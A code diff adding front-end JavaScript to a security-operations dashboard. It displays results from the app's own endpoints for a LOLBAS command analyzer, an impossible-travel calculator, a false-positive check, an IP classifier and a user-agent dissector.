+                    <span class="font-bold text-white font-mono text-sm">${escapeHtml(tool.binary)}</span>
+                    <span class="text-[10px] font-mono px-2 py-0.5 rounded border font-bold ${riskColor}">${tool.risk} SEVERITY</span>
+                  </div>
+                  <span class="text-[10px] font-mono text-cyber-cyan border border-cyber-cyan/30 px-2 py-0.5 rounded bg-cyber-cyan/10">MITRE ${escapeHtml(tool.mitre_id)}</span>
+                </div>
+                <p class="text-xs text-slate-300 font-sans">${escapeHtml(tool.description)}</p>
+                ${flagsHtml ? `<div class="space-y-1.5"><div class="text-[11px] font-mono text-slate-400 font-bold">Flagged Dangerous Arguments / Parameters:</div>${flagsHtml}</div>` : ''}
+              </div>
+            `;
+          });
+        } else {
+          html = `<div class="bg-cyber-card border border-cyber-border rounded-xl p-4 text-xs font-mono text-emerald-400">✓ No known critical LOLBAS abuse patterns detected in this command string.</div>`;
+        }
+
+        if (data.extracted_urls && data.extracted_urls.length > 0) {
+          html += `
+            <div class="bg-cyber-card border border-cyber-border rounded-xl p-4 space-y-2">
+              <div class="text-xs font-bold text-amber-400 font-mono">Harvested Embedded URLs in Command:</div>
+              <div class="space-y-1">
+                ${data.extracted_urls.map(u => `<div class="text-xs font-mono text-slate-300 break-all p-1.5 rounded bg-[#090d16] border border-cyber-border">${escapeHtml(u)}</div>`).join('')}
+              </div>
+            </div>
+          `;
+        }
+
+        resEl.innerHTML = html;
+        lucide.createIcons();
+      } catch (e) {
+        resEl.innerHTML = `<div class="p-4 bg-cyber-card border border-red-500/40 rounded-xl text-xs font-mono text-red-400">Error: ${e.message}</div>`;
+      }
+    }
+
+    // Tool 3: Impossible Travel Calculator
+    function setTravelPreset(p) {
+      if (p === 'jkt_fra') {
+        document.getElementById('soc-tr-loc1').value = 'Jakarta, Indonesia';
+        document.getElementById('soc-tr-lat1').value = '-6.2088';
+        document.getElementById('soc-tr-lon1').value = '106.8456';
+        document.getElementById('soc-tr-time1').value = '2026-10-13 08:00:00';
+        document.getElementById('soc-tr-loc2').value = 'Frankfurt, Germany';
+        document.getElementById('soc-tr-lat2').value = '50.1109';
+        document.getElementById('soc-tr-lon2').value = '8.6821';
+        document.getElementById('soc-tr-time2').value = '2026-10-13 08:35:00';
+      } else if (p === 'nyc_lon') {
+        document.getElementById('soc-tr-loc1').value = 'New York City, USA';
+        document.getElementById('soc-tr-lat1').value = '40.7128';
+        document.getElementById('soc-tr-lon1').value = '-74.0060';
+        document.getElementById('soc-tr-time1').value = '2026-10-13 14:00:00';
+        document.getElementById('soc-tr-loc2').value = 'London, UK';
+        document.getElementById('soc-tr-lat2').value = '51.5074';
+        document.getElementById('soc-tr-lon2').value = '-0.1278';
+        document.getElementById('soc-tr-time2').value = '2026-10-13 14:10:00';
+      } else if (p === 'normal') {
+        document.getElementById('soc-tr-loc1').value = 'Jakarta, Indonesia';
+        document.getElementById('soc-tr-lat1').value = '-6.2088';
+        document.getElementById('soc-tr-lon1').value = '106.8456';
+        document.getElementById('soc-tr-time1').value = '2026-10-13 08:00:00';
+        document.getElementById('soc-tr-loc2').value = 'Bandung, Indonesia';
+        document.getElementById('soc-tr-lat2').value = '-6.9175';
+        document.getElementById('soc-tr-lon2').value = '107.6191';
+        document.getElementById('soc-tr-time2').value = '2026-10-13 11:30:00';
+      }
+      runSocTravelCalculation();
+    }
+
+    async function runSocTravelCalculation() {
+      const lat1 = parseFloat(document.getElementById('soc-tr-lat1').value);
+      const lon1 = parseFloat(document.getElementById('soc-tr-lon1').value);
+      const time1 = document.getElementById('soc-tr-time1').value;
+      const lat2 = parseFloat(document.getElementById('soc-tr-lat2').value);
+      const lon2 = parseFloat(document.getElementById('soc-tr-lon2').value);
+      const time2 = document.getElementById('soc-tr-time2').value;
+      const loc1_name = document.getElementById('soc-tr-loc1').value;
+      const loc2_name = document.getElementById('soc-tr-loc2').value;
+
+      const resEl = document.getElementById('soc-travel-results');
+      resEl.classList.remove('hidden');
+      resEl.innerHTML = `<div class="p-4 bg-cyber-card border border-cyber-border rounded-xl text-xs font-mono text-slate-400">Computing distance and velocity...</div>`;
+
+      try {
+        const resp = await fetch('/api/soc/impossible-travel', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ lat1, lon1, time1, lat2, lon2, time2, loc1_name, loc2_name })
+        });
+        const data = await resp.json();
+        if (!data.success) throw new Error(data.error);
+
+        const badgeColor = data.is_impossible ? 'text-red-400 bg-red-500/15 border-red-500/30' : 'text-emerald-400 bg-emerald-500/15 border-emerald-500/30';
+
+        resEl.innerHTML = `
+          <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-4">
+            <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-cyber-border/60 pb-3">
+              <div>
+                <span class="text-xs font-bold text-white font-mono">${escapeHtml(data.location_a)} ➔ ${escapeHtml(data.location_b)}</span>
+              </div>
+              <span class="text-xs font-mono font-bold px-2.5 py-1 rounded border ${badgeColor}">${escapeHtml(data.verdict)}</span>
+            </div>
+            <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs font-mono">
+              <div class="p-3 rounded-lg bg-[#090d16] border border-cyber-border">
+                <div class="text-[10px] text-slate-500">Distance</div>
+                <div class="text-sm font-bold text-white mt-0.5">${data.distance_km} km</div>
+                <div class="text-[10px] text-slate-500">${data.distance_miles} miles</div>
+              </div>
+              <div class="p-3 rounded-lg bg-[#090d16] border border-cyber-border">
+                <div class="text-[10px] text-slate-500">Elapsed Time</div>
+                <div class="text-sm font-bold text-white mt-0.5">${data.elapsed_minutes} mins</div>
+                <div class="text-[10px] text-slate-500">${data.elapsed_hours} hours</div>
+              </div>
+              <div class="p-3 rounded-lg bg-[#090d16] border border-cyber-border col-span-2">
+                <div class="text-[10px] text-slate-500">Required Ground Speed</div>
+                <div class="text-base font-bold text-cyber-cyan mt-0.5">${data.required_speed_kmh} km/h</div>
+                <div class="text-[10px] text-slate-400">Max Passenger Jet Speed: ~900 km/h</div>
+              </div>
+            </div>
+            <div class="p-3 rounded-lg bg-[#090d16] border border-cyber-border text-xs font-mono text-slate-300">
+              <span class="text-slate-500 font-bold">Analyst Assessment:</span> ${escapeHtml(data.explanation)}
+            </div>
+          </div>
+        `;
+        lucide.createIcons();
+      } catch (e) {
+        resEl.innerHTML = `<div class="p-4 bg-cyber-card border border-red-500/40 rounded-xl text-xs font-mono text-red-400">Error: ${e.message}</div>`;
+      }
+    }
+
+    // Tool 4: False Positive & Whitelist Helper
+    function quickFillFp(val) {
+      document.getElementById('soc-fp-input').value = val;
+      runSocFpCheck();
+    }
+
+    async function runSocFpCheck() {
+      const indicator = document.getElementById('soc-fp-input').value.trim();
+      if (!indicator) return;
+      const resEl = document.getElementById('soc-fp-results');
+      resEl.classList.remove('hidden');
+      resEl.innerHTML = `<div class="p-4 bg-cyber-card border border-cyber-border rounded-xl text-xs font-mono text-slate-400">Checking against verified whitelists & CIRCL NSRL...</div>`;
+
+      try {
+        const resp = await fetch('/api/soc/fp-check', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ indicator })
+        });
+        const data = await resp.json();
+
+        const badgeColor = data.is_likely_false_positive ? 'text-emerald-400 bg-emerald-500/15 border-emerald-500/30' : 'text-amber-400 bg-amber-500/15 border-amber-500/30';
+        const badgeText = data.is_likely_false_positive ? 'LIKELY FALSE POSITIVE' : 'STANDARD TRIAGE REQUIRED';
+
+        let matchesHtml = (data.matches || []).map(m => `
+          <div class="p-3 rounded-lg bg-[#090d16] border border-cyber-border space-y-1 text-xs font-mono">
+            <div class="flex items-center justify-between">
+              <span class="font-bold text-white">${escapeHtml(m.category)}</span>
+              <span class="text-[10px] text-emerald-400 font-bold">${escapeHtml(m.confidence)}</span>
+            </div>
+            <div class="text-slate-300">${escapeHtml(m.description)}</div>
+          </div>
+        `).join('');
+
+        resEl.innerHTML = `
+          <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-3">
+            <div class="flex items-center justify-between border-b border-cyber-border/60 pb-3">
+              <span class="text-xs font-bold text-white font-mono">${escapeHtml(data.target)}</span>
+              <span class="text-xs font-mono font-bold px-2.5 py-1 rounded border ${badgeColor}">${badgeText}</span>
+            </div>
+            <p class="text-xs text-slate-300 font-sans">${escapeHtml(data.recommendation)}</p>
+            ${matchesHtml ? `<div class="space-y-2 pt-1"><div class="text-[11px] font-mono text-slate-400 font-bold">Identified Whitelist Matches:</div>${matchesHtml}</div>` : ''}
+          </div>
+        `;
+        lucide.createIcons();
+      } catch (e) {
+        resEl.innerHTML = `<div class="p-4 bg-cyber-card border border-red-500/40 rounded-xl text-xs font-mono text-red-400">Error: ${e.message}</div>`;
+      }
+    }
+
+    // Tool 5: IP Infrastructure Classifier
+    function setIpPreset(ip, asn, org) {
+      document.getElementById('soc-ip-input').value = ip;
+      document.getElementById('soc-ip-asn').value = asn;
+      document.getElementById('soc-ip-org').value = org;
+      runSocIpClassify();
+    }
+
+    async function runSocIpClassify() {
+      const ip = document.getElementById('soc-ip-input').value.trim();
+      const asn = document.getElementById('soc-ip-asn').value.trim();
+      const org = document.getElementById('soc-ip-org').value.trim();
+      if (!ip) return;
+
+      const resEl = document.getElementById('soc-ipclass-results');
+      resEl.classList.remove('hidden');
+      resEl.innerHTML = `<div class="p-4 bg-cyber-card border border-cyber-border rounded-xl text-xs font-mono text-slate-400">Classifying IP infrastructure...</div>`;
+
+      try {
+        const resp = await fetch('/api/soc/ip-classify', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ ip, asn, org })
+        });
+        const data = await resp.json();
+
+        const riskColor = data.risk_level === 'CRITICAL' ? 'text-red-400 bg-red-500/15 border-red-500/30' : (data.risk_level === 'HIGH' ? 'text-amber-400 bg-amber-500/15 border-amber-500/30' : 'text-blue-400 bg-blue-500/15 border-blue-500/30');
+
+        resEl.innerHTML = `
+          <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-3">
+            <div class="flex items-center justify-between border-b border-cyber-border/60 pb-3">
+              <span class="text-xs font-bold text-white font-mono">${escapeHtml(data.ip)}</span>
+              <span class="text-xs font-mono font-bold px-2.5 py-1 rounded border ${riskColor}">${data.risk_level} RISK</span>
+            </div>
+            <div class="p-3 rounded-lg bg-[#090d16] border border-cyber-border space-y-1 text-xs font-mono">
+              <div class="text-[10px] text-slate-500">Infrastructure Classification</div>
+              <div class="text-sm font-bold text-white">${escapeHtml(data.classification)}</div>
+              ${data.is_tor_exit ? '<div class="text-xs text-red-400 font-bold">🚨 Active Tor Project Exit Relay Node</div>' : ''}
+            </div>
+            <div class="text-xs font-mono text-slate-300 p-3 rounded-lg bg-[#090d16] border border-cyber-border">
+              <span class="text-slate-500 font-bold">Analyst Guidance:</span> ${escapeHtml(data.analyst_guidance)}
+            </div>
+          </div>
+        `;
+        lucide.createIcons();
+      } catch (e) {
+        resEl.innerHTML = `<div class="p-4 bg-cyber-card border border-red-500/40 rounded-xl text-xs font-mono text-red-400">Error: ${e.message}</div>`;
+      }
+    }
+
+    // Tool 6: User-Agent Dissector
+    function quickFillUa(ua) {
+      document.getElementById('soc-ua-input').value = ua;
+      runSocUaDissect();
+    }
+
+    async function runSocUaDissect() {
+      const user_agent = document.getElementById('soc-ua-input').value.trim();
+      const resEl = document.getElementById('soc-ua-results');
+      resEl.classList.remove('hidden');
+      resEl.innerHTML = `<div class="p-4 bg-cyber-card border border-cyber-border rounded-xl text-xs font-mono text-slate-400">Dissecting User-Agent signatures...</div>`;
+
+      try {
+        const resp = await fetch('/api/soc/user-agent', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ user_agent })
+        });
+        const data = await resp.json();
+
+        const threatColor = data.threat_level === 'CRITICAL' ? 'text-red-400 bg-red-500/15 border-red-500/30' : (data.threat_level === 'HIGH' ? 'text-amber-400 bg-amber-500/15 border-amber-500/30' : (data.threat_level === 'MEDIUM' ? 'text-blue-400 bg-blue-500/15 border-blue-500/30' : 'text-emerald-400 bg-emerald-500/15 border-emerald-500/30'));
+
+        resEl.innerHTML = `
+          <div class="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-3">
+            <div class="flex items-center justify-between border-b border-cyber-border/60 pb-3">
+              <span class="text-xs font-bold text-white font-mono">${escapeHtml(data.category)}</span>
+              <span class="text-xs font-mono font-bold px-2.5 py-1 rounded border ${threatColor}">${data.threat_level} THREAT</span>
+            </div>
+            <div class="p-3 rounded-lg bg-[#090d16] border border-cyber-border space-y-1 text-xs font-mono">
+              <div class="text-[10px] text-slate-500">Detection Verdict</div>
+              <div class="text-sm font-bold text-white">${escapeHtml(data.verdict)}</div>
+            </div>
+            <div class="text-xs font-mono text-slate-300 p-3 rounded-lg bg-[#090d16] border border-cyber-border">
+              <span class="text-slate-500 font-bold">Analysis:</span> ${escapeHtml(data.explanation)}
+            </div>
+          </div>
+        `;
+        lucide.createIcons();
+      } catch (e) {
+        resEl.innerHTML = `<div class="p-4 bg-cyber-card border border-red-500/40 rounded-xl text-xs font-mono text-red-400">Error: ${e.message}</div>`;
+      }
+    }
   </script>
+
 </body>
 </html>
